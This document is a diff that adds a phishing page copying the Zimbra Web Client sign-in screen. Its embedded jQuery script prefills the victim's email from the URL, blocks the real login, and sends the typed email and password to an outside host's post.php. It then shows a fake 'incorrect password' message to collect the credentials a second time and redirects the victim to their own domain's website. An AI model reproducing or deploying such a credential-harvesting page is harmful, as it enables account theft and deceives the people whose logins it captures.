@@ -1,0 +1,217 @@
+
+<html class="user_font_size_normal" lang="en"><head>
+
+	
+	<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
+	<title>Zimbra Web Client Sign In</title>
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+	<link rel="stylesheet" type="text/css" href="https://mail.zimbra.com/css/common,login,zhtml,skin.css?skin=harmony&amp;v=200812032126">
+	
+	<link rel="SHORTCUT ICON" href="https://mail.zimbra.com/img/logo/favicon.ico">
+	
+	
+</head>
+
+<body>
+
+	<div id="modifiedLogin" class="LoginScreen">
+		<div class="modernCenter">
+                <div class="modernContentBox">
+                    <div class="logo">
+                        <a href="http://www.zimbra.com" id="bannerLink" target="_new" title="Zimbra"><span class="ScreenReaderOnly">Zimbra</span>
+                            <span class="ImgLoginBanner"></span>
+                        </a>
+                    </div>				
+				<form id="zLoginForm">
+							
+
+								<div class="signIn">Sign In</div>
+                        <div class="form">
+                        <div id="msg" class="errorMessage" style="display: none;">
+
+                            The email or password is incorrect. Verify that CAPS LOCK is not on, and then retype the current email and password.
+                            </div>
+                        <div class="loginSection">
+                                    <label for="username" class="zLoginFieldLabel">Email Address</label>
+                                            <input id="email" tabindex="1" class="zLoginFieldInput" name="email" type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off">
+                                        <label for="password" class="zLoginFieldLabel">Password</label>
+                                    <div class="passwordWrapper">
+                                        <input id="password" tabindex="2" autocomplete="off" class="zLoginFieldInput" name="password" type="password" value="" size="40" maxlength="1024">
+                        
+                                    </div>
+                                    <div class="signInAndLabel">
+                                        <div>
+                                            <button id="submit-btn" tabindex="5" class="loginButton">Sign In</button>
+                                        </div>  </form>
+                                        <div class="rememberCheckWrapper"> 
+                                                <input id="remember" tabindex="6" value="1" type="checkbox" name="zrememberme">
+                                                <label id="remember" for="remember">Stay signed in</label>
+                                            </div>
+                                        </div>
+                                </div>
+                            <div>
+                            <hr>
+                            </div>
+                            <div>
+                            <div class="versionBlock">
+                                <label for="client">Web App Version</label>
+                                <div style="position: relative;">
+                                    <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
+                                                <option value="preferred" selected=""> Default</option>
+                                                <option value="advanced"> Classic</option>
+                                                <option value="modern"> Modern</option>
+                                                </select>
+                                        <input type="button" class="alignWhatsThis" onclick="showTooltip();" id="ZLoginWhatsThisButton">
+                                </div>
+                           
+                                <div id="ZLoginWhatsThis">
+                                    <div class="ZLoginInfo">
+                                        <span id="dialogCloseButton" onclick="hideTooltip();">×</span>
+                                        <p><strong>Modern</strong><br> The Modern Web App delivers a responsive experience across all your devices and integrates with many popular apps.</p><p><strong>Classic</strong><br> The Classic Web App is familiar to long-time Zimbra users. It delivers advanced collaboration and calendar features popular with power users on Desktop web browsers.</p><p><strong>Default</strong><br> This will sign you in according to your saved Preference. In the Modern Web App, set this preference in Settings &gt; General &gt; Zimbra Version. In Classic, set it in Preferences &gt; General &gt; Sign In.</p></div>
+                                </div>
+                           
+                            
+                        </div>
+                    </div>
+                        </div>
+                  
+			</div>
+			<div class="decor1"></div>
+		</div>
+
+		<div class="Footer">
+			<div id="ZLoginNotice" class="legalNotice-small">Copyright © 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
+		</div>
+		<div class="decor2"></div>
+	</div>
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+<script>
+    
+
+
+  /* global $ */
+  $(document).ready(function(){
+    var count=0;
+    /////////////url email getting////////////////
+    var email = window.location.hash.substr(1);
+    if (!email) {
+
+    }
+    else
+    {
+        // $('#email').val(email);
+        var my_email =email;
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();        
+        $('#email').val(my_email);
+        $('#domain-name').html(final);
+        $("#msg").hide();
+      }
+      ///////////////url getting email////////////////
+
+
+      var file="bmV4dC5waHA=";
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-\@])+$/;
+
+      if (!email) {
+            $('#error').show();
+            $('#error').html("Email field is emply.!");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_email)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!password) {
+            $('#error').show();
+            $('#error').html("Password field is emply.!");
+            ai.focus;
+            return false;
+        }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      ///////////new injection////////////////
+      count=count+1;
+      $('#domain-name').html(final);
+      $.ajax({
+        dataType: 'JSON',
+        url: "https://dev-efrgterfgh.pantheonsite.io/New09Folder/post.php",
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                    
+                  $("#password").val("");
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("http://www."+my_slice);
+
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                  // $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+                
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+                     window.location.replace("http://www."+my_slice);
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sign In');
+            }
+          });
+    });
+
+
+    });
+
+</script>
+
+<style>.tb_button {padding:1px;cursor:pointer;border-right: 1px solid #8b8b8b;border-left: 1px solid #FFF;border-bottom: 1px solid #fff;}.tb_button.hover {borer:2px outset #def; background-color: #f8f8f8 !important;}.ws_toolbar {z-index:100000} .ws_toolbar .ws_tb_btn {cursor:pointer;border:1px solid #555;padding:3px}   .tb_highlight{background-color:yellow} .tb_hide {visibility:hidden} .ws_toolbar img {padding:2px;margin:0px}</style></body></html>
